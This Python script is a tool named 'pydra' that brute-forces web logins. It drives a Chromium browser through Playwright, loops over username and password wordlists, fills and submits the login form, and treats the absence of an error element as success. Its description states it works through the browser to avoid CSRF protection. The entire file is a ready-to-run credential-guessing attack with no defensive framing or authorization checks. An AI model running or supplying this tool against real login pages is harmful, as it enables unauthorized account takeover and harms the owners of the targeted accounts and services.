import argparse
from dataclasses import dataclass
from playwright.sync_api import sync_playwright


@dataclass
class Arguments:
    login_form_url: str
    user_list: str
    password_list: str
    user_selector: str
    password_selector: str
    btn_selector: str
    incorrect_selector: str
    headless: bool = False


def login_attempt(user: str, password: str, args: Arguments):
    print(f"logging attempt with {user} and {password}")
    with sync_playwright() as p:
        browser = p.chromium.launch(headless=args.headless)
        page = browser.new_page()
        page.goto(args.login_form_url)
        page.wait_for_url(args.login_form_url)
        page.wait_for_selector(args.user_selector)
        page.wait_for_selector(args.password_selector)
        page.locator(args.user_selector).fill(user)
        page.locator(args.password_selector).fill(password)
        page.locator(args.btn_selector).click()
        try:
            page.wait_for_selector(args.incorrect_selector, timeout=1000)
            return False
        except Exception:
            return True
        finally:
            browser.close()


def get_args():
    parser = argparse.ArgumentParser(
        prog='pydra',
        description='pydra does username/password brute force cracking using \
                    user/password list from the browser to avoid CSRF protection')

    parser.add_argument('--login-form-url', required=True)
    parser.add_argument('--user-list', required=True)
    parser.add_argument('--passwd-list', required=True)
    parser.add_argument('--user-selector', required=True)
    parser.add_argument('--passwd-selector', required=True)
    parser.add_argument('--button-selector', required=True)
    parser.add_argument('--incorrect-selector', required=True)
    parser.add_argument('--show-browser', action="store_true")

    args = parser.parse_args()

    return Arguments(args.login_form_url, args.user_list, args.passwd_list, args.user_selector,
                     args.passwd_selector, args.button_selector, args.incorrect_selector, not args.show_browser)


def load_word_list(word_list_file):
    with open(word_list_file, 'r') as wlf:
        lines = wlf.readlines()
        return [line.rstrip() for line in lines]


if __name__ == '__main__':
    args = get_args()
    users = load_word_list(args.user_list)
    passwords = load_word_list(args.password_list)
    for user in users:
        for password in passwords:
            success = login_attempt(user, password, args)
            if success:
                print(
                    f"Login successful with user={user} and password={password}")
                exit(0)
